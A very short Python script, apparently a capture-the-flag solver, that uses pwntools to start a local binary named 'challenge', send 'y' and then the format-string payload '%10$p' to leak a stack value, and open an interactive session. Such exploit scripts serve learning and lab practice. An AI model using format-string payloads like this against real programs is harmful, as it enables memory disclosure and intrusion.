from pwn import *

r = process('./challenge')
r.sendline('y')
r.sendline('%10$p')
r.interactive()
